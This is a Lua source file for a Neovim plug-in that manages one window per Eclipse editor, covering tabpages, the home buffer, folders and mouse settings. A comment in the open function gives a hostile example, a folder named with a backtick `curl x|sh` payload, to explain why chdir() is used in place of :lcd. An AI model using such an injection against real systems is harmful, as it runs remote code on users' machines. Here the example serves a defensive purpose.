-- SPDX-FileCopyrightText: 2026 Jm6CnDDXBwFTakS
-- SPDX-License-Identifier: EPL-2.0

-- Installs the module `neovim4eclipse.windows`: a Neovim window per Eclipse editor, each alone in
-- its own tabpage (docs/design/WINDOWS.md; Java side `DocumentBuffers` and `EditorWindows`).
-- Argument: the home buffer's number. Returns the home window's id: the window the plug-in started
-- in, which shows a document when its editor has no window of its own, and is never closed by the
-- plug-in.
--
-- Why tabpages: one window per tab fills Neovim's screen, which is the attached editor's size
-- (VIEWPORT.md), so `H`, `L` and `Ctrl-D` match the editor, and window commands stay inside the
-- editor's tab. `'showtabline'` is set to 0, a setting the plug-in changes (docs/USER_GUIDE.md,
-- "Neovim settings the plug-in changes"): Neovim's default, 1, would show a tab line as soon as a
-- second editor has a window, and take a row from the editor.
--
-- The functions, each called by one of the short scripts in LuaScripts:
-- - `open(buf, folder)`: LuaScripts.OPEN_WINDOW.
-- - `show(win, buf)`: LuaScripts.SHOW_WINDOW.
-- - `travel(win, buf, line, col)`: LuaScripts.TRAVEL_WINDOW.
-- - `close(win, fallback)`: LuaScripts.CLOSE_WINDOW.
-- - `release(buf, fallback)`: LuaScripts.RELEASE_BUFFER.
-- - `home_buffer()`: LuaScripts.HOME_BUFFER; `close` and `release` use it too, for a fallback
--   buffer Neovim wiped.
-- - `is_side_window(win)`: whether a window is a floating or special one beside an editor's, where
--   `:q` is Neovim's (LuaScripts.WINDOW_COMMANDS).
--
-- Quietly means with `'eventignore'` set to `all`: what the plug-in does to a window that is not
-- the current one fires no autocommand, so Eclipse does not take it for something the user did.
-- Example: `nvim_win_set_buf` on a window of another tab enters it for a moment and fires
-- `BufEnter` (WINDOWS.md, E7), which Eclipse would follow as a jump.
--
-- The safety net: `WinClosed` sends `eclipse_window_closed(win)`, so that a window the user closed
-- in Neovim (`:tabclose`, a plug-in's `nvim_win_close`) is forgotten, and its editor gets a new one
-- at its next attach. The plug-in's own closes are quiet and do not send it. A home window closed
-- that way is opened again by the next `show` of it.
--
-- The second net, `WinNew`, closes a window Eclipse cannot show (a stray split, the quickfix
-- window) once the command that opened it is over; floats are left to `close_undrawn`
-- (LuaScripts.CLOSE_UNDRAWN_FLOAT). A changed buffer outlives that close, whatever its
-- `'bufhidden'`. Two kinds of window it hands to a page editor instead: a `:checkhealth` report's
-- and a help window (`:help`, `:helpgrep`). Their buffer stays, and `eclipse_view_page(kind, buf,
-- line)` asks Eclipse to show it in a page window of its own (`show_page`); the window it came in
-- closes, with no message (`docs/ARCHITECTURE.md`, decision 10). A window on a file (a picker's
-- split action) becomes an Eclipse split or editor tab on that file, at its cursor
-- (`take_file_window`).
--
-- The files, in the order they run, each a chunk of its own (Lua allows 200 locals in one, and
-- each file's helpers stay its own):
-- - init.lua (this one): the module's shared state, the editors' windows (`open`, `show`,
--   `travel`, `close`, `release`, the home window) and the helpers the others use.
-- - pages.lua: page windows (help, messages, `:checkhealth`).
-- - floats.lua: plug-ins' floating windows, and how Eclipse's routes leave them.
-- - start.lua: the floats a config opened while Neovim started.
-- - net.lua: the safety nets for windows opened some other way; it answers the home window.
--
-- How they share: this file puts what the files share, S (`neovim4eclipse.windows.shared`), in
-- `package.loaded`, and the module, M, on it (`S.module`); each other file starts by taking both
-- from there. The module itself is registered (`neovim4eclipse.windows` in `package.loaded`) by
-- the last file, net.lua, so that it is there only once every file has loaded: a file that fails
-- to load leaves no module half made for the other scripts to call. A value another file sets is
-- a field of S (`S.insert_float`); a table made once here is a local of each file that uses it
-- (`local own = S.own`, the same table); a helper another file calls is called as
-- `S.quietly(...)`. A rule worth keeping: a name with `S.` comes from another file. `M` is what
-- other modules and Eclipse's scripts call.
--
-- Sent as LuaScripts.WINDOWS (core/LuaModules runs each file as a chunk of its own).

local M = {}
-- What the module's files share (each is a chunk of its own, so a local of one is not
-- seen in another): the values that change as it runs, here, so that every file reads
-- and sets the same one; and the tables and helpers another file uses, set on S below
-- their definition (S.own = own). Example: M.home() opens the home window again when the
-- user closed it, and every later close (closable) compares with the new one.
local S = {
  -- The home buffer's number (the argument), made anew if Neovim wiped it (M.home_buffer).
  home_buf = tonumber((select(1, ...))),
  -- The home window: the one the plug-in started in (M.home opens it again if closed).
  home = vim.api.nvim_get_current_win(),
  -- The plug-in's float the current insert began in, or nil (InsertEnter, floats.lua): leaving
  -- ends that insert (M.leave_float), not one begun elsewhere since.
  insert_float = nil,
  -- The float that had the keyboard as Neovim's start ended, before any editor was
  -- shown (M.close_start_floats): the first editor takes it along (settle_start_float).
  pending_start_float = nil,
  -- Whether Eclipse has shown an editor yet (M.show).
  editor_shown = false,
}
-- Registered first: the other files, each a chunk of its own, find what they share here
-- (core/LuaModules runs them in order, this one first), the module with it. The module
-- itself is registered by net.lua, the last.
S.module = M
package.loaded['neovim4eclipse.windows.shared'] = S

local group = vim.api.nvim_create_augroup('neovim4eclipse_windows', { clear = true })
S.group = group
--- What to call a floating window in a message: its buffer's filetype ("lazy",
--- "TelescopePrompt"), else "a plug-in".
local function float_name(win)
  local ok, ft = pcall(function() return vim.bo[vim.api.nvim_win_get_buf(win)].filetype end)
  return ok and ft ~= '' and ft or 'a plug-in'
end
S.float_name = float_name
-- The windows the plug-in opened and has not closed (the home window, the editors' and
-- the pages', these marked 'page'): any other plain window is a stray one (the WinNew
-- safety net, net.lua), and a floating or special one is a side window (M.is_side_window).
local own = { [S.home] = true }
S.own = own
-- Each page window's own buffer (M.open_page), which it keeps (M.restore_page).
local page_buf = {}
S.page_buf = page_buf
-- Each page window's kind: 'messages', 'help' or 'checkhealth' (M.open_page). It says
-- which buffers the window may change to: a help page follows Ctrl-] to another help
-- buffer (M.follow_page); every other change is put back.
local page_kind = {}
S.page_kind = page_kind
-- The windows the safety net has looked at, so that it knows a new one: only a new
-- window's :checkhealth report or help goes to a page editor (take_health_report,
-- take_help), never one the net saw before.
local seen = {}
S.seen = seen
for _, win in ipairs(vim.api.nvim_list_wins()) do
  seen[win] = true
end
-- The window each window was first entered from (WinEnter, by the WinNew net in net.lua);
-- one opened without entering it has none until it is entered. Kept per window, since
-- a check scheduled for an earlier window may be the one that finds a report.
local opened_from = {}
S.opened_from = opened_from
-- The editor's window the action behind each new window began in, through any window
-- the same action opened on the way. Example: fzf-lua's tab action on two files opens
-- the second tab page from the first, which is no editor's and is gone by the time the
-- net reaches the second, so it is worked out here, as each window opens.
local from_editor = {}
S.from_editor = from_editor
vim.o.showtabline = 0

--- Runs fn(...) without Neovim's file info message ('shortmess' F: putting a buffer in a
--- window gives one, as :b does, and two messages in a row would open Eclipse's output
--- popup; see SHOW_BUFFER), and returns its result. An error in fn is raised again once
--- 'shortmess' is back as it was.
local function without_file_info(fn, ...)
  local saved = vim.o.shortmess
  if not saved:find('F', 1, true) then
    vim.o.shortmess = saved .. 'F'
  end
  local ok, result = pcall(fn, ...)
  vim.o.shortmess = saved
  if not ok then
    error(result, 0)
  end
  return result
end

--- Runs fn(...) with every autocommand off ('eventignore' all) and without the file info
--- message, and returns its result.
local function quietly(fn, ...)
  local saved = vim.o.eventignore
  vim.o.eventignore = 'all'
  local ok, result = pcall(without_file_info, fn, ...)
  vim.o.eventignore = saved
  if not ok then
    error(result, 0)
  end
  return result
end
S.quietly = quietly

--- The home buffer's number: made anew, an unlisted scratch buffer as at start, if Neovim
--- wiped it (a plug-in's :bwipeout 2, its usual number, or one that wipes every buffer nvim_list_bufs() has),
--- and remembered, so that every later call and the home window agree on it. Eclipse
--- asks for it (HOME_BUFFER) when the home buffer it knows is gone.
function M.home_buffer()
  if not vim.api.nvim_buf_is_valid(S.home_buf) then
    S.home_buf = vim.api.nvim_create_buf(false, true)
  end
  return S.home_buf
end

--- The home window, opened again (quietly, in a new tab) if the user closed it.
function M.home()
  if not vim.api.nvim_win_is_valid(S.home) then
    local buf = M.home_buffer()
    S.home = quietly(function()
      return vim.api.nvim_tabpage_get_win(vim.api.nvim_open_tabpage(buf, false, {}))
    end)
    own[S.home] = true
  end
  return S.home
end

--- Shows buf in win without adding to win's jump history (:keepjumps). nvim_win_set_buf
--- and nvim_set_current_buf add a jump to the window they change, and the plug-in changes
--- windows behind the user's back: the window left behind by a travel got a jump each
--- time. With such stray jumps, Ctrl-O (and Ctrl-I) never ran out between two editors:
--- each found one more jump into the other file, and at the end of a window's history
--- Eclipse's Back (the fallback, SETUP) found the other editor again. Example: :e
--- other.txt, :e #, :e #, then Ctrl-O held down went back and forth for ever. The !
--- hides the buffer left even with changes, which live in Eclipse's document.
local function put_buf(win, buf)
  vim.api.nvim_win_call(win, function()
    vim.cmd('keepjumps buffer! ' .. buf)
  end)
end
S.put_buf = put_buf

--- Puts buf in win: as Neovim does it when win is current (BufEnter tells Eclipse), quietly if not.
local function set_buf(win, buf)
  if vim.api.nvim_win_get_buf(win) == buf then
    return
  end
  if win == vim.api.nvim_get_current_win() then
    without_file_info(put_buf, win, buf)
  else
    quietly(put_buf, win, buf)
  end
end

--- A window's folder, read by window and tabpage number: getcwd() inside nvim_win_call()
--- on a window of another tabpage answers with another window's folder (0.12.6).
local function folder_of(win)
  local at = vim.fn.win_id2tabwin(win)
  return vim.fn.getcwd(at[2], at[1])
end

--- Gives win a folder of its own (chdir(..., 'window'), never :lcd). Returns whether win
--- now works in folder, with a window-local folder. Silent, as chdir() is.
---
--- Why a folder with $ is refused: chdir() expands no backticks, wildcards or ~, so
--- nothing in a folder's name runs, but it does expand environment variables: a folder
--- named e$SHELL lands in e/bin/zsh (probed on 0.12.6), and DirChanged autocommands
--- would see that folder. With no $ in the name, chdir() lands in folder or, if it
--- fails, changes nothing; the check after it only says which. The cost: an editor on a
--- real folder with $ in its name keeps the folder it copied, as when chdir() fails.
---
--- Skipped only when win has a local folder that is folder already: a window with
--- none follows a later global :cd (example: Neovim's folder is the project's, the
--- window copies it without a local one, and a :cd /tmp in another editor moves it).
---
--- Paths are compared only by the one rule (PATHS, the first script the session
--- sends); without it nothing is changed and false is returned.
function M.set_folder(win, folder)
  local paths = package.loaded['neovim4eclipse.paths']
  if not paths or folder:find('$', 1, true) then
    return false
  end
  local at = vim.fn.win_id2tabwin(win)
  if vim.fn.haslocaldir(at[2], at[1]) == 1 and paths.same(folder_of(win), folder) then
    return true -- there already: no chdir(), so no DirChanged for nothing
  end
  vim.api.nvim_win_call(win, function()
    pcall(vim.fn.chdir, folder, 'window')
  end)
  return paths.same(folder_of(win), folder)
end

function M.open(buf, folder)
  if not vim.api.nvim_buf_is_valid(buf) then
    return -2 -- wiped in Neovim (:noautocmd bwipeout): Eclipse makes the buffer anew
  end
  -- Not entered: fires WinNew, TabNew, BufWinEnter and WinScrolled only (E7), so the
  -- user's BufWinEnter autocommands run, and Eclipse sees no switch. Without the file
  -- info putting the buffer in a window would give ('shortmess' F): Neovim shows it at
  -- its next redraw, for an editor the user opened in Eclipse.
  local win = vim.api.nvim_tabpage_get_win(without_file_info(vim.api.nvim_open_tabpage, buf, false, {}))
  own[win] = true
  vim.api.nvim_win_call(win, function()
    -- A new window copies the jump history of the current one (E7): another editor's
    -- jumps. Ctrl-O in a fresh editor then has nowhere to go, as in a fresh Vim window.
    vim.cmd('clearjumps')
    -- The folder once, here, so a :lcd the user types stays with the editor. Without
    -- one, the window keeps the folder it copied from the current window (the editor
    -- attached before, as a Vim window inherits it). With 'autochdir', Neovim moves to
    -- the file's folder on entering the window anyway (checked on 0.12.6).
    -- A folder that does not exist (yet: a new file in a missing folder, written with
    -- :w ++p) is skipped, keeping the copied one. Silent: Neovim echoes the new folder,
    -- a message that would replace the one the user is reading (the write message of
    -- the :w that just opened another editor, say).
    -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
    -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
    -- the moment one of its files opened. chdir() runs nothing and says nothing, but it
    -- expands $VAR, so M.set_folder refuses a folder with $ in its name.
  end)
  if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
    M.set_folder(win, folder)
  end
  return win
end

--- Whether Neovim is in an insert, or in the one command of Ctrl-O inside one ('niI'), after
--- which the insert would go on.
local function in_insert()
  local mode = vim.api.nvim_get_mode().mode
  return mode:match('^[iR]') ~= nil or mode:match('^ni') ~= nil
end
S.in_insert = in_insert

--- Ends an insert that a plug-in carried out of its float, keeping the cursor of the window
--- Neovim is in now. For Eclipse's own routes the insert has ended already, in the float
--- (M.end_float_insert); this is what is left for a float that moved Neovim itself.
--- :stopinsert takes effect once the running call is over, in that window, and Esc moves the
--- cursor a column left there: it is put back as the insert ends, so the editor's caret
--- stays. Until then the cursor waits on the next character that is not white space, or
--- an empty line: an insert that has only auto-indented ('o' in the float, nothing typed)
--- ends by removing the white space at the cursor of the window Neovim is in, here the
--- document's. Example: 'o' in a float whose plug-in then enters the editor's window, the
--- document's cursor at the start of "    keep": the cursor waits on the k, and the line
--- keeps its indentation. A document of only white space has no such place: its line
--- loses that white space (Eclipse's routes do not come here, M.end_float_insert).
--- After Ctrl-O no Esc comes and no indent is left, so there is nothing to put back.
local function stop_insert_in_place()
  if vim.api.nvim_get_mode().mode:match('^ni') then
    vim.cmd.stopinsert()
    return
  end
  local landed = vim.api.nvim_get_current_win()
  local at = vim.api.nvim_win_get_cursor(landed)
  local safe = vim.fn.searchpos([[\S\|^$]], 'cnw')
  if safe[1] > 0 then
    pcall(vim.api.nvim_win_set_cursor, landed, { safe[1], safe[2] - 1 })
  end
  vim.api.nvim_create_autocmd('ModeChanged', { once = true, pattern = '[iR]*:*', callback = function()
    if vim.api.nvim_win_is_valid(landed) and vim.api.nvim_get_current_win() == landed then
      pcall(vim.api.nvim_win_set_cursor, landed, at)
    end
  end })
  vim.cmd.stopinsert()
end
S.stop_insert_in_place = stop_insert_in_place

--- Whether M.show enters a window for win and buf: buf still there (a plug-in's :bwipeout
--- wipes it), and win the home window (-1) or a window still there.
local function shows(win, buf)
  return vim.api.nvim_buf_is_valid(buf) and (win < 0 or vim.api.nvim_win_is_valid(win))
end
S.shows = shows

function M.show(win, buf)
  if not shows(win, buf) then
    -- -2: wiped in Neovim, Eclipse shows the home buffer; -1: closed in Neovim, Eclipse
    -- opens a new one
    return vim.api.nvim_buf_is_valid(buf) and -1 or -2
  end
  if win < 0 then
    win = M.home()
  end
  local current = vim.api.nvim_get_current_win()
  set_buf(win, buf)
  if win ~= current then
    vim.api.nvim_set_current_win(win) -- BufEnter, with the buffer Eclipse expects
  end
  S.editor_shown = true
  -- After entering win: a float moved while current would take Neovim back to its tab page.
  M.bring_start_floats(win, vim.v.vim_did_enter ~= 1 or S.pending_start_float ~= nil)
  S.settle_start_float(win)
  -- One check, where every show ends, from Neovim's state: in the editor's window, an insert
  -- begun in a float (any float, the one waiting or not, closed or left) ends here, or
  -- the keys meant for it would be typed into the document.
  if S.insert_float ~= nil and vim.api.nvim_get_current_win() == win and in_insert() then
    stop_insert_in_place()
  end
  return win
end

function M.travel(win, buf, line, col)
  quietly(function()
    put_buf(win, buf) -- no jump in the window left behind (see put_buf)
    local last = vim.api.nvim_buf_line_count(buf)
    pcall(vim.api.nvim_win_set_cursor, win, { math.max(1, math.min(line, last)), math.max(0, col) })
  end)
end

--- The buffer the home window shows instead of one being closed: fallback, which Eclipse
--- names (the attached buffer, or the home buffer), or the home buffer, made anew if need
--- be, when Neovim wiped fallback. The one rule for every close (M.close, M.release), so
--- that none puts a wiped buffer in a window. Example: a plug-in ran :bwipeout 2, the
--- home buffer Eclipse still names; closing the active editor shows a new home buffer
--- instead of failing with E86 (or leaving Neovim's own choice in the home window).
local function fallback_buf(fallback)
  return vim.api.nvim_buf_is_valid(fallback) and fallback or M.home_buffer()
end

--- Leaves win (quietly) for the home window showing fallback, if win is the current one.
local function leave(win, fallback)
  if win == vim.api.nvim_get_current_win() then
    local to = M.home()
    quietly(function()
      vim.api.nvim_set_current_win(to)
      put_buf(to, fallback_buf(fallback))
    end)
  end
end

--- Whether win is an editor's window that M.close and M.release close: still there, and
--- not the home window, which is never closed (it shows another buffer instead).
local function closable(win)
  return vim.api.nvim_win_is_valid(win) and win ~= S.home
end
S.closable = closable

--- Closes an editor's window quietly. It is forgotten here too: being quiet, the close
--- fires no WinClosed, which would.
local function close_quietly(win)
  quietly(vim.api.nvim_win_close, win, true)
  own[win] = nil
  page_buf[win] = nil
  page_kind[win] = nil
  seen[win] = nil -- no WinClosed while quiet
end

function M.close(win, fallback)
  if closable(win) then
    S.leave_float_of(win)
    leave(win, fallback)
    close_quietly(win)
  end
  return { M.home(), M.home_buffer() }
end

function M.release(buf, fallback)
  local closed = {}
  for _, win in ipairs(vim.fn.win_findbuf(buf)) do
    if win == S.home then
      set_buf(win, fallback_buf(fallback))
    elseif closable(win) then -- leaving a float may have closed one
      S.leave_float_of(win)
      leave(win, fallback)
      close_quietly(win)
      closed[#closed + 1] = win
    end
  end
  return { closed, M.home_buffer() }
end

--- Whether win (0: the current one) is a window Neovim opened beside an editor's for a
--- moment, which :q, :close and Ctrl-W c close in Neovim, not the editor: a floating
--- window the user entered (hover documentation, a plug-in's picker) or one of Neovim's
--- special windows the safety net (net.lua) leaves open (the command-line window).
--- Example: a second K into a hover float, then :q closes the float.
function M.is_side_window(win)
  win = win == 0 and vim.api.nvim_get_current_win() or win
  return not own[win] and vim.fn.win_gettype(win) ~= ''
end

--- Why :tabonly! does not run (WINDOW_COMMANDS refuses it): it would discard the changes of
--- every other editor tab at once, where Vim's keeps their buffers hidden.
M.TABS = "with ! it would discard every other editor tab's changes; :tabonly asks about them"
--- Whether win shows one of ui2's own buffers (its command line, messages, pager or
--- prompt; LuaScripts.UI2): Neovim's own windows, which the safety net leaves alone.
local function shows_ui2_buffer(win)
  local ui2 = package.loaded['vim._core.ui2']
  if not ui2 or not vim.api.nvim_win_is_valid(win) then
    return false
  end
  local buf = vim.api.nvim_win_get_buf(win)
  for _, own in pairs(ui2.bufs) do
    if own == buf then
      return true
    end
  end
  return false
end
S.shows_ui2_buffer = shows_ui2_buffer
-- 'mouse', told to Eclipse, which checks it before it sends a click on a grid (a floating
-- window, q:, a page; util/MouseOption). Eclipse cannot ask at the click: Neovim holds an
-- option read while it waits for a key (after f or r). Nor can Neovim drop the click as
-- it reads it: vim.on_key runs after mappings, and dropping the first key of a mapping's
-- right-hand side would run the rest as commands on the user's text. Told at each change,
-- and looked at again at each mode change, for a :noautocmd set. "h" means every mode in
-- a help buffer, so there it is told with an "a". Example: "nvi"; "ha" in :help with "h".
local told_mouse
local function tell_mouse()
  local value = vim.o.mouse
  if value:find('h', 1, true) and vim.bo.buftype == 'help' then
    value = value .. 'a'
  end
  if value ~= told_mouse then
    told_mouse = value
    vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_mouse_option', value)
  end
end
vim.api.nvim_create_autocmd({ 'ModeChanged', 'BufEnter', 'BufWinEnter', 'UIEnter' },
  { group = group, callback = tell_mouse })
vim.api.nvim_create_autocmd('OptionSet',
  { group = group, pattern = { 'mouse', 'buftype' }, callback = tell_mouse })
tell_mouse()
